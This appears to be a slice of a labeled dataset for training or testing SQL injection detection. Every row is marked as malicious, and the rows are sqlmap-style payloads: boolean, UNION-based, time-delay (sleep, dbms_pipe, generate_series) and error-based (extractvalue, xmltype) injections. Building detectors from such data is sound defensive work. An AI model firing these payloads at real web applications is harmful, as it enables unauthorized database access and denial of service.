row_index,payload_norm,label,sqli_type_hint
4710,1 ) as fnpq where 5209 = 5209,1,
4711,"1"" ) ) ) order by 1#",1,
4712,1 where 8889 = 8889,1,
4713,"1' where 4334 = 4334 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
4714,"-9873"" union all select 8020,8020,8020,8020,8020,8020#",1,
4715,"1 where 8045 = 8045 union all select null,null,null--",1,
4716,1'|| ( select 'lzzr' where 2477 = 2477,1,
4717,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""zyoo"" = ""zyoo",1,
4718,"1%"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""%"" = """,1,
4719,-7369 or 9323 = 9323#,1,
4720,select ( case when ( 3444 = 8424 ) then 3444 else 3444* ( select 3444 from information_schema.character_sets ) end ) #,1,
4721,1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,
4722,end and ( 'hmtt' like 'hmtt,1,
4723,"1, ( select ( case when ( 4828 = 2600 ) then 1 else 1/ ( select 0 ) end ) )",1,
4724,"1' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'hstg' like 'hstg",1,
4725,1'+ ( select qugu where 2287 = 2287 order by 1#,1,
4726,1' in boolean mode ) and 2006 = 2006,1,
4727,"1"" where 1452 = 1452 union all select null,null,null,null--",1,
4728,-2790' ) ) or 8571 = 8571--,1,
4729,-2393%' ) ) union all select 2772--,1,
4730,"1'|| ( select 'bvic' from dual where 4839 = 4839 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'",1,
4731,"1 ) ) as tbiq where 7159 = 7159 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
4732,"1' where 3700 = 3700 union all select null,null,null--",1,
4733,"1 where 8333 = 8333 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
4734,"-7142' ) ) union all select 5083,5083,5083,5083#",1,
4735,"1%"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
4736,"1"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""ddun"" = ""ddun",1,
4737,1 where 5080 = 5080,1,
4738,1 ) ) as kiqk where 7366 = 7366 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
4739,"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",1,
